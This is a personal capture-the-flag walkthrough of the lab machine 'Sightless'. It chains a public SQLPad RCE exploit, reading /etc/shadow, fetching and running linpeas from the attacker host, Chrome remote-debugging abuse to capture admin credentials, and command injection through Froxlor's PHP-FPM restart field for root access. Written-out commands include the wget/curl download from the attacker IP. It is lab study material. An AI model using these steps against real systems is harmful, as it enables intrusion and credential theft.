# Sightless walkthrough

## Connecting to Sightless

Sightless IP Address:           10.10.11.32
Sightless domain:               sightless.htb

My (Attacker) IP address:       10.10.16.3

Command used to connect to VPN: `sudo openvpn LAB_VPN`

## Scanning and Enumeration

Tools used: nmap

### Nmap Scan

Command: `nmap --min-rate 3000 -p- -A 10.10.11.32`

The command above is used to find out the open ports in the victim machine. The flags used are:

1. `--min-rate 3000`: This flag is used to limit the scan rate to 3000
2. `-p-`: This flag is used to scan all the ports
3. `-A`: This flag is used to enable OS detection and version detection

Results:

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-18 22:56 +08
Nmap scan report for 10.10.11.32
Host is up (0.034s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings:
|   GenericLines:
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://sightless.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=12/18%Time=6762E2AD%P=x86_64-pc-linux-gnu%r(
SF:GenericLines,A0,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x2
SF:0Server\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x2
SF:0try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\
SF:x20being\x20more\x20creative\r\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=12/18%OT=21%CT=1%CU=37713%PV=Y%DS=2%DC=T%G=Y%TM=676
OS:2E2F1%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=102%TI=Z%CI=Z%II=I%TS=A
OS:)SEQ(SP=100%GCD=1%ISR=103%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=100%GCD=3%ISR=103%T
OS:I=Z%CI=Z%II=I%TS=A)OPS(O1=M542ST11NW7%O2=M542ST11NW7%O3=M542NNT11NW7%O4=
OS:M542ST11NW7%O5=M542ST11NW7%O6=M542ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE
OS:88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M542NNSNW7%CC=Y%Q=)T1(R=Y%
OS:DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A
OS:=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=
OS:G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   78.86 ms 10.10.16.1
2   14.03 ms 10.10.11.32

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.14 seconds
```

Based on the nmap scan results, the open ports and their corresponding services are:

1. Port 21 -- FTP
2. Port 22 -- SSH
3. Port 80 -- HTTP

### Testing out FTP

Since port 21 is open, we can try to login anonymously to the server via FTP using username and password "anonymous". However, this was unsuccessful. So we'll be moving on to the next port.

SSH is a secure way to access the server, but we don't have the credentials to login. Therefore, we'll be moving on to the next port, port 80 hosting the HTTP server.

### Visiting the website

Before visiting the website, we can see that in the nmap scan above, there is a line `http-title: Did not follow redirect to http://sightless.htb/`. This line indicates that the domain for the IP address that we have is **sightless.htb**. So, based on this information we can add the line `10.10.11.32  sightless.htb` into the `/etc/hosts` file. By adding this line, we can just input **sightless.htb** into our browser to visit the site that is being hosted by the victim machine.

Once that is done, we can now visit the website. Visiting the website does not provide much information, but there are a few links that brings us to interesting pages. One of the links in their Services section brings us to Sqlpad. Once we're in the sqlpad page, we can see that find the version of Sqlpad that is running though its About page, which is version 6.10.0.

![Sqlpad version](./Screenshots/Sightless%20sqlpad%20version.png)

## Exploitation

By searching the internet for exploits targeting Sqlpad version 6.10.0, there is one exploit from 0xRoqeeb that allows for RCE ([GitHub](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944)). Using this script, we can establish a reverse connection to the Sqlpad instance that is running on the victim machine.

Once the reverse connection is established, we can start performing further enumeration and possibly privilege escalation. Digging through the directories and files, we can find that we are already `root` and have read access to `/etc/shadow` file. This means that we can read the hashed passwords of all users on the system.

Going through `/etc/shadow`, we retrieved the passwords for (listed in the format username:password):

1. root:blindside
2. michael:insaneclownposse

With these usernames and passwords, we can now try to SSH into the victim machine using these credentials. However, only `michael`'s user:pass combination worked. Once logged in as michael, we can retrieve the user flag, which is found in `michael`'s home directory.

However, `michael` does not have administrator or root privileges, so we need to find another way to escalate privileges to find the root flag. To find a foothold, we can first bring in `linpeas.sh` to the victim machine, which is useful to find privilege escalation opportunities. To bring in the `linpeas.sh` script, we can first host a python server from the attacker's machine and then use `curl` or `wget` in the victim machine to download the script. The overall steps are as below:

1. Go to the directory that has the `linpeas.sh` script on the attacker's machine.
2. Run `python3 -m http.server PORT_NUMBER`, PORT_NUMBER can be any unused port on the attacker's machine.
3. Go to `michael`'s session that was previously established
4. Go to a directory where you have write access.
5. Run `wget http://10.10.16.3:8880/linpeas.sh -o linpeas.sh` or `curl http://10.10.16.3:8880/linpeas.sh -o linpeas.sh`, 10.10.16.3 is my machine's (attacker) IP address and the port that is hosting HTTP server using command 2 is 8880.
6. Run `chmod +x linpeas.sh` to make the script executable.
7. Run `./linpeas.sh` to run the script on the victim machine.

It will take some time for the script to fully execute, but once it is done, we will need to go through the results to find a possible entry point to gain root privileges. Based on the results, it seems that one of the users on the victim machine is running remote debugging using Chrome and linpeas is flagging it as a possible entry point.

![Chrome Remote Debugging as Entry Point](./Screenshots/Priv%20Esc%20through%20Chrome%20Remote%20Debugging.png)

## Privilege Escalation

Based on the information from `linpeas`, we can deduce that we will be somehow using Chrome's Remote Debugging feature to perform the privilege escalation. Further investigation through the internet shows that there are ways to abuse that feature. Below is the link that I referenced:

1. [Chrome Remote Debugger Pentesting](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/)

Following the steps on the resource above, the command that was used to perform port forwarding to the attacker machine was `ssh -L LOCAL_PORT:localhost:REMOTE_PORT michael@sightless.htb` where LOCAL_PORT is an unused port on the attacker machine while REMOTE_PORT is a port that is serving or hosting some service on the victim machine.

Once connected, we can then setup Chrome to starting debugging or inspecting the pages that are forwarded from the victim machine. The setup can be done by first opening Chrome and then inputting `chrome://inspect` into the search bar. Once inside, we can add devices to monitor by pressing on **Configure** next to the **Discover network targets** label.

Once all forwarded ports have been added, the list should look something like this:

![Chrome Remote Debugger loaded with the targets to debug](./Screenshots/Chrome%20Remote%20Debugger%20abuse.png)

When the targets connect or has activity, entries will show up under ***Remote Target***. We can click on **Inspect** to take a look at the specifics that are going on for those targets and in the one with Froxlor, we can see in the **Payloads** section, a username and password combination as shown below:

![Froxlor username and password combination](./Screenshots/Froxlor%20Admin%20password.png)

With this username and the hint of the website (the name Froxlor from the Remote Targets section as well as being one of the service that is listed in the main website), we can try accessing link that was listed int eh Remote Target, which was admin.sightless.htb or if that is inaccessible, then 127.0.0.1:8080.

After getting access to it, we can try the username and password we retrieved earlier to login. Once logged in, we can see that we are in some kind of dashboard that allows us to tweak with the server's configuration.

Going to the PHP tab and under the PHP-FPM versions section, we can see a field named **php-fpm restart command** and it seems to be Linux commands instead of just PHP code. We can try to use this to execute commands in the server and hopefully it is executed with root privileges.

We can immediately try to copy the root.txt, which normally contains the root flag and is normally found in the `/root` directory, to the `/tmp` directory using the command `cp /root/root.txt /tmp/root.txt`. If this command succeeds, then we know that the commands executed from this section uses root privileges.

However, this command is only executed when something restarts. Going into the System tab, we can find a toggle button for PHP to enable/disable it. So I tried toggling this to off and then on again, hopefully achieving the *restart* effect and surprisingly it did. And the command is executed with root privileges as well.

So now I have the root.txt in the `/tmp` directory and I tried to use `cat` to read the contents but failed due to `permission denied`. It seems that I still do not have the privileges to read the file. Further research online seems to say I can copy the `id_rsa` file into the `/tmp` directory to read the file and thus I did exactly that using the method above and finally I can read the file and get the root flag.
